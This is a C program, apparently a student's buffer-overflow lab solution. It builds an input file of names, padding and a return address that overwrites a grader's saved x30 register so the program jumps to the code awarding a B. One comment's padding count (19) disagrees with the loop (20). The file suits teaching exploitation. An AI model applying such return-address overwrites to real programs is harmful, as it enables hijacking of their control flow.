/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* By James Swinehart and Benny Wertheimer                            */
/*--------------------------------------------------------------------*/

/* Produces a file called dataB with the student name, a nullbyte, 
padding to overrun the stack, and the address of the instruction in main 
to get a B, the latter of which will overwrite getName's stored x30. */

#include <stdio.h>
#include <stdlib.h>

/* Writes a file dataB with our names (28 bytes + 1 nullbyte), padding 
(19 bytes), and the address of our target statement (0x400890) as a 
little-endian unsigned integer to overrun the grader's buffer array and 
run the statement that sets our grade to a B. */
int main() {
    FILE *psFile;
    int i;

    /* Open the file */
    psFile = fopen("dataB", "w");
 
    /* Write students' names */
    fprintf(psFile, "J. Swinehart & B. Wertheimer");

    /* Write 20 bytes of padding to overrun 48 byte buffer array 
    to reach x30*/
    for (i = 0; i < 20; i++) {
        putc('\0', psFile);
    }

    /* Overwrite x30 with the address of the statement to get a B */
    putc(0x90, psFile);
    putc(0x08, psFile);
    putc(0x40, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile); 

    /* Close the file */
    fclose(psFile);

    return 0;
}